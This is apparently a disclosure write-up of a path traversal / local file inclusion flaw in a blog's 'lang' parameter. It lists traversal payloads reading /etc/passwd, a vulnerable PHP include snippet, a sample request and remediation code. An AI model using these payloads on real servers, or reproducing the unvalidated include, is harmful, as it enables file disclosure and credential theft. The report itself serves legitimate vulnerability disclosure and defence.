# Local File Inclusion (LFI) / Path Traversal - Multilang Blog

## Summary

I identified a Local File Inclusion (LFI) / Path Traversal vulnerability in the `lang` parameter of the application's multilang blog.

The application accepts user-controlled input through the `lang` parameter and uses it to include language files from the server without proper validation or sanitization. By injecting path traversal sequences (`../`), an attacker can read sensitive files outside the intended directory, including system configuration files like `/etc/passwd`.

An attacker can craft a malicious URL that reads arbitrary files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**Local File Inclusion (LFI) / Path Traversal**

## Vulnerable Parameter

```text
lang
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/multilang-blog/?lang=languages/en.php
```

## Steps to Reproduce

1. Navigate to the vulnerable multilang blog at `https://kzlabs.in/subdomains/multilang-blog/`.

2. Replace the value of the `lang` parameter with a path traversal payload:

   ```text
   ../../../../../../../../etc/passwd
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/subdomains/multilang-blog/?lang=../../../../../../../../etc/passwd
   ```

4. Observe that the application reads and displays the contents of `/etc/passwd` in the response.

5. The output reveals system user accounts, including the `root` user.

## Payloads Used

```text
/etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//....//....//....//etc/passwd
```

URL-encoded versions:
```text
%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## Proof of Concept

The application takes the `lang` parameter and uses it to include a file without validation:

```php
<?php
$lang = $_GET['lang'];
include($lang);
?>
```

The request:

```http
GET /subdomains/multilang-blog/?lang=../../../../../../../../etc/passwd HTTP/2
Host: kzlabs.in
Cookie: PHPSESSID=04sv3msp8c0c4agrr7flkesno2
```

Response:


## Impact

An attacker can:

- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, `/etc/hosts`)
- Read application configuration files (database credentials, API keys)
- Read application source code
- Extract sensitive user data
- Enumerate system users and services
- Potentially achieve Remote Code Execution (RCE) by reading log files or combining with other vulnerabilities
- Bypass authentication by reading session files or configuration

## Recommendation

To mitigate this vulnerability:

- **Avoid User-Controlled Paths**: Do not use user input directly to determine file paths.

- **Use a Whitelist**: Only allow specific, pre-approved language files to be accessed.
  ```php
  $allowed_langs = ['en', 'es', 'fr', 'de', 'hi'];
  $lang = basename($_GET['lang']);
  if (!in_array($lang, $allowed_langs)) {
      die("Language not allowed.");
  }
  $path = "/var/www/multilang-blog/languages/" . $lang . ".php";
  ```

- **Validate Input**: Use `basename()` to prevent directory traversal.
  ```php
  $lang = basename($_GET['lang']);
  $path = "/var/www/multilang-blog/languages/" . $lang;
  ```

- **Use Realpath**: Resolve the real path and verify it's within the intended directory.
  ```php
  $base_dir = '/var/www/multilang-blog/languages/';
  $real_path = realpath($base_dir . $_GET['lang']);
  if (strpos($real_path, $base_dir) !== 0) {
      die("Invalid file path.");
  }
  ```

- **Disable `allow_url_include`**: Prevent remote file inclusion in `php.ini`.
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

- **Chroot Jail**: Restrict the web server to a specific directory.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block path traversal payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
